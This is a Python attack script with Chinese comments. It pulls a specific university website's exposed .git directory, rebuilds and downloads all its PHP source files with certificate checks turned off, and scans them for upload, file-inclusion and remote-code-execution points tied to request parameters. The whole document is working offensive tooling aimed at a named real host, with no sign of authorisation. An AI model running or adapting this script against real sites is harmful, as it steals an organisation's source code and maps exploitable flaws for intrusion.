#!/usr/bin/env python3
import requests
import urllib3
import zlib
import re
import os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "https://olympic.su.ac.th/.git"
output_dir = "/tmp/git_php_files"
os.makedirs(output_dir, exist_ok=True)

print("[*] 从.git下载所有PHP文件...")

def get_tree_files(tree_hash, path=""):
    tree_path = f"{base_url}/objects/{tree_hash[:2]}/{tree_hash[2:]}"
    tree_resp = requests.get(tree_path, verify=False, timeout=5)
    
    if tree_resp.status_code != 200:
        return []
    
    tree_data = zlib.decompress(tree_resp.content)
    files = []
    
    pos = 0
    while pos < len(tree_data):
        null_pos = tree_data.find(b'\x00', pos)
        if null_pos == -1:
            break
        
        entry = tree_data[pos:null_pos]
        parts = entry.split(b' ', 1)
        if len(parts) == 2:
            mode = parts[0].decode()
            filename = parts[1].decode()
            
            hash_start = null_pos + 1
            if hash_start + 20 <= len(tree_data):
                file_hash = tree_data[hash_start:hash_start+20].hex()
                
                if mode.startswith('4'):  # tree
                    sub_files = get_tree_files(file_hash, f"{path}{filename}/")
                    files.extend(sub_files)
                elif filename.endswith('.php'):  # blob
                    files.append((f"{path}{filename}", file_hash))
        
        pos = null_pos + 21
    
    return files

root_tree = "206be85b2f5820dcbb812b49c73c77c48027d4d3"
all_php_files = get_tree_files(root_tree)

print(f"[+] 找到 {len(all_php_files)} 个PHP文件")

vuln_files = []

for file_path, file_hash in all_php_files:
    blob_path = f"{base_url}/objects/{file_hash[:2]}/{file_hash[2:]}"
    blob_resp = requests.get(blob_path, verify=False, timeout=5)
    
    if blob_resp.status_code == 200:
        blob_data = zlib.decompress(blob_resp.content)
        null_header = blob_data.find(b'\x00')
        content = blob_data[null_header+1:] if null_header != -1 else blob_data[50:]
        content_str = content.decode('utf-8', errors='ignore')
        
        # 保存文件
        safe_path = file_path.replace('/', '_')
        with open(f"{output_dir}/{safe_path}", 'w', encoding='utf-8', errors='ignore') as f:
            f.write(content_str)
        
        vulns = []
        
        # 检查文件上传
        if 'move_uploaded_file' in content_str or '$_FILES' in content_str:
            files_params = re.findall(r'\$_FILES\[["\']([^"\']+)["\']\]', content_str)
            upload_paths = re.findall(r'move_uploaded_file\([^,]+,\s*["\']([^"\']+)["\']', content_str)
            vulns.append(('upload', files_params, upload_paths))
        
        # 检查文件包含
        if 'include' in content_str.lower() or 'require' in content_str.lower():
            include_code = re.findall(r'(include|require)[^;]+;', content_str, re.IGNORECASE | re.DOTALL)
            get_params = re.findall(r'\$_GET\[["\']([^"\']+)["\']\]', content_str)
            post_params = re.findall(r'\$_POST\[["\']([^"\']+)["\']\]', content_str)
            vulns.append(('include', include_code[:3], get_params + post_params))
        
        # 检查RCE
        if 'eval' in content_str.lower() or 'system' in content_str.lower() or 'exec' in content_str.lower():
            rce_code = re.findall(r'(eval|system|exec|shell_exec|passthru|popen)[^;]+;', content_str, re.IGNORECASE)
            get_params = re.findall(r'\$_GET\[["\']([^"\']+)["\']\]', content_str)
            post_params = re.findall(r'\$_POST\[["\']([^"\']+)["\']\]', content_str)
            vulns.append(('rce', rce_code[:3], get_params + post_params))
        
        if vulns:
            vuln_files.append((file_path, vulns))
            print(f"[!] {file_path}")
            for vuln_type, details, params in vulns:
                print(f"    {vuln_type}: {params[:5]}")

print(f"\n[+] 下载完成，发现 {len(vuln_files)} 个可能有漏洞的文件")
print(f"[+] 文件保存在: {output_dir}")
